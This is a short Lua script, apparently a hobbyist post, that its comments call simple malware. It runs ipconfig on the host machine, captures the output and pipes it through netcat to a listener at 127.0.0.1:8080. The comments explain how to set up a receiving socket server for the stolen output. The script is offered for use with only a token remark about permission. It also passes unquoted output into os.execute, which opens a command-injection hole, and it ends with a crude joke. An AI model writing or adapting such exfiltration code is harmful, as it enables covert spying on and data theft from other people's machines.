--epic location :3
--btw if you plan to use this make sure that you have full permission of the user to use this script on them
--note1: this script cannot run on it's own it needs netcat!
--note2: also it needs some other programming language that let's you compile (C, C++, nelua, etc..)

--commad bruh
local cmd = [[ipconfig]]

--handling the command
local handle = io.popen(cmd)
local result = handle:read("*a")
handle:close()

--so basically this reads if there is any output and if there is it just echos the entire output to the machine on which the server is hosted
--note: for the message to be sent you need to code a socket script so you could receive the message :/ 
if result:find("") then
  os.execute("echo "..result.." | nc 127.0.0.1 8080")
end

--yeah to make some simple malware it ain't that easy bruv well now it is easy sorry *easier
--as it requires much more than just this script such as: socket programming, understanding other languages like C, C++ etc...

-- the reason why you need socket programming is well because you need some server that accepts the message like where tf is it gonna go lmao
--  also you don't need any special language like C to make a server with some socket library!
--   you can use any language you are familiar with even with lua with luasocket the library is pretty easy to learn so there aren't so many complications!
--    GLHF ;D
--     8=========D
